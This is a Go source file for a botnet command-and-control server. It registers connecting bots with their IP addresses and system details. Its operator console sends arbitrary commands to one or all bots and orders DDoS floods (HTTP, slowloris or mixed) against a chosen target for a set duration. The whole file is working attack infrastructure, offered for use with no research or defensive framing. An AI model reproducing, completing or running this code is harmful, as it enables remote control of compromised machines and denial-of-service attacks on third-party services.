package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"github.com/fatih/color"
)

type Bot struct {
	ID         string
	Conn       net.Conn
	IP         string
	SystemInfo string
	LastSeen   time.Time
	Responses  chan string // Channel for bot responses
}

type C2Server struct {
	Bots    map[string]*Bot
	BotLock sync.RWMutex
}

func NewC2Server() *C2Server {
	return &C2Server{
		Bots: make(map[string]*Bot),
	}
}

// PrintColoredStatus prints a status message with color
func PrintColoredStatus(status string, message string) {
	switch status {
	case "success":
		color.Green("[+] %s", message)
	case "error":
		color.Red("[-] %s", message)
	case "info":
		color.Cyan("[*] %s", message)
	case "warning":
		color.Yellow("[!] %s", message)
	default:
		fmt.Println(message)
	}
}

func (s *C2Server) HandleConnection(conn net.Conn) {
	defer conn.Close()

	// Get initial bot info
	reader := bufio.NewReader(conn)
	infoData, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	var info struct {
		ID         string `json:"id"`
		SystemInfo string `json:"system_info"`
	}
	if err := json.Unmarshal([]byte(infoData), &info); err != nil {
		return
	}

	// Register new bot
	bot := &Bot{
		ID:         info.ID,
		Conn:       conn,
		IP:         conn.RemoteAddr().(*net.TCPAddr).IP.String(),
		SystemInfo: info.SystemInfo,
		LastSeen:   time.Now(),
		Responses:  make(chan string, 100), // Buffer for responses
	}

	s.BotLock.Lock()
	s.Bots[bot.ID] = bot
	s.BotLock.Unlock()

	color.Green("[+] New bot connected: %s (%s)", bot.ID, bot.IP)

	// Start a goroutine to handle bot responses
	go func() {
		for {
			select {
			case response := <-bot.Responses:
				color.Cyan("[%s] %s", bot.ID, response)
			}
		}
	}()

	// Handle commands from admin console
	for {
		cmd, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		bot.LastSeen = time.Now()
		
		// Send response to channel instead of directly to console
		bot.Responses <- cmd
	}

	// Remove disconnected bot
	s.BotLock.Lock()
	delete(s.Bots, bot.ID)
	s.BotLock.Unlock()
	color.Red("[-] Bot disconnected: %s (%s)", bot.ID, bot.IP)
}

func (s *C2Server) ListBots() []*Bot {
	s.BotLock.RLock()
	defer s.BotLock.RUnlock()

	bots := make([]*Bot, 0, len(s.Bots))
	for _, bot := range s.Bots {
		bots = append(bots, bot)
	}

	// Sort by last seen time (newest first)
	sort.Slice(bots, func(i, j int) bool {
		return bots[i].LastSeen.After(bots[j].LastSeen)
	})

	return bots
}

// GetBotByIndex returns a bot by its index in the sorted list
func (s *C2Server) GetBotByIndex(index int) (*Bot, error) {
	bots := s.ListBots()
	if index < 0 || index >= len(bots) {
		return nil, fmt.Errorf("invalid bot index")
	}
	return bots[index], nil
}

func (s *C2Server) SendCommandToAll(cmd string) int {
	s.BotLock.RLock()
	defer s.BotLock.RUnlock()

	count := 0
	for _, bot := range s.Bots {
		if bot.Conn != nil {
			_, err := fmt.Fprintf(bot.Conn, "%s\n", cmd)
			if err == nil {
				count++
			}
		}
	}
	return count
}

func (s *C2Server) SendCommandToBot(botID, cmd string) error {
	s.BotLock.RLock()
	defer s.BotLock.RUnlock()

	bot, exists := s.Bots[botID]
	if !exists {
		return fmt.Errorf("bot not found")
	}

	if bot.Conn != nil {
		_, err := fmt.Fprintf(bot.Conn, "%s\n", cmd)
		return err
	}
	return fmt.Errorf("bot connection is nil")
}

func (s *C2Server) Start(port string) {
	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		fmt.Printf("Error starting server: %v\n", err)
		return
	}
	defer listener.Close()

	fmt.Printf("C2 Server listening on :%s\n", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Printf("Error accepting connection: %v\n", err)
			continue
		}
		go s.HandleConnection(conn)
	}
}

func displayBanner() {
	banner := `
	██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
	██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
	██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
	██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
	╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
	 ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
	                                                                      
	                    Command & Control Server v1.0                     
	                                                                      
`
	color.Cyan(banner)
}

func displayHelp() {
	color.Yellow("\nAvailable commands:")
	commands := []struct {
		Cmd         string
		Description string
	}{
		{"list", "List all connected bots"},
		{"cmd <command>", "Send command to all bots"},
		{"cmdto <index|botID> <command>", "Send command to specific bot by index or ID"},
		{"att <target> <duration> [method]", "Start DDoS attack (methods: http, slowloris, mixed)"},
		{"stop", "Stop current attack"},
		{"clear", "Clear the screen"},
		{"help", "Show this help message"},
		{"exit", "Exit the C2 server"},
	}

	for _, cmd := range commands {
		fmt.Printf("  %s - %s\n", color.CyanString(cmd.Cmd), cmd.Description)
	}
	fmt.Println()
}

func clearScreen() {
	fmt.Print("\033[H\033[2J")
}

func main() {
	clearScreen()
	displayBanner()

	server := NewC2Server()
	go server.Start("4444")

	color.Green("[+] C2 Server started successfully")
	color.Green("[+] Waiting for bots to connect...")
	color.Yellow("[!] Type 'help' for available commands")

	// Admin console
	scanner := bufio.NewScanner(os.Stdin)
	for {
		color.Set(color.FgHiCyan)
		fmt.Print("\nC2> ")
		color.Unset()
		if !scanner.Scan() {
			break
		}

		cmd := strings.TrimSpace(scanner.Text())
		switch {
		case cmd == "list":
			bots := server.ListBots()
			color.Yellow("\nConnected Bots (%d):", len(bots))
			color.Yellow("====================================")
			if len(bots) == 0 {
				color.Red("No bots connected")
			} else {
				for i, bot := range bots {
					color.Cyan("%d. ID: %s", i+1, bot.ID)
					fmt.Printf("   IP: %s\n", bot.IP)
					fmt.Printf("   Last Seen: %s\n", time.Since(bot.LastSeen).Round(time.Second))
					fmt.Printf("   System Info: %s\n", bot.SystemInfo)
					color.Yellow("------------------------------------")
				}
			}

		case strings.HasPrefix(cmd, "cmd "):
			command := strings.TrimPrefix(cmd, "cmd ")
			count := server.SendCommandToAll(command)
			if count > 0 {
				color.Green("[+] Command sent to %d bots", count)
			} else {
				color.Red("[-] No bots available to receive command")
			}

		case strings.HasPrefix(cmd, "cmdto "):
			parts := strings.SplitN(cmd, " ", 3)
			if len(parts) < 3 {
				color.Red("Usage: cmdto <index|botID> <command>")
				continue
			}
			
			// Check if the identifier is a number (index) or string (botID)
			var err error
			var targetBot *Bot
			
			index, indexErr := strconv.Atoi(parts[1])
			if indexErr == nil {
				// It's an index
				targetBot, err = server.GetBotByIndex(index - 1) // Convert to 0-based index
			} else {
				// It's a botID
				err = server.SendCommandToBot(parts[1], parts[2])
				if err == nil {
					color.Green("[+] Command sent to bot %s", parts[1])
				} else {
					color.Red("[-] Error sending command: %v", err)
				}
				continue
			}
			
			if err != nil {
				color.Red("[-] Error: %v", err)
				continue
			}
			
			err = server.SendCommandToBot(targetBot.ID, parts[2])
			if err != nil {
				color.Red("[-] Error sending command: %v", err)
			} else {
				color.Green("[+] Command sent to bot %s", targetBot.ID)
			}

		case strings.HasPrefix(cmd, "att "):
			parts := strings.SplitN(cmd, " ", 4)
			if len(parts) < 3 {
				color.Red("Usage: att <target> <duration> [method]")
				color.Yellow("Methods: http (default), slowloris, mixed")
				continue
			}
			method := "http"
			if len(parts) >= 4 {
				method = parts[3]
			}
			command := fmt.Sprintf("att %s %s %s", parts[1], parts[2], method)
			count := server.SendCommandToAll(command)
			if count > 0 {
				color.Green("[+] Attack command sent to %d bots (%s method)", count, method)
			} else {
				color.Red("[-] No bots available to perform attack")
			}

		case cmd == "stop":
			count := server.SendCommandToAll("stop")
			if count > 0 {
				color.Green("[+] Stop command sent to %d bots", count)
			} else {
				color.Red("[-] No bots available to stop")
			}

		case cmd == "clear":
			clearScreen()
			displayBanner()

		case cmd == "help":
			displayHelp()

		case cmd == "exit":
			color.Yellow("[!] Exiting C2 Server...")
			return

		case cmd == "":
			// Do nothing for empty commands

		default:
			color.Red("Unknown command. Type 'help' for available commands")
		}
	}
}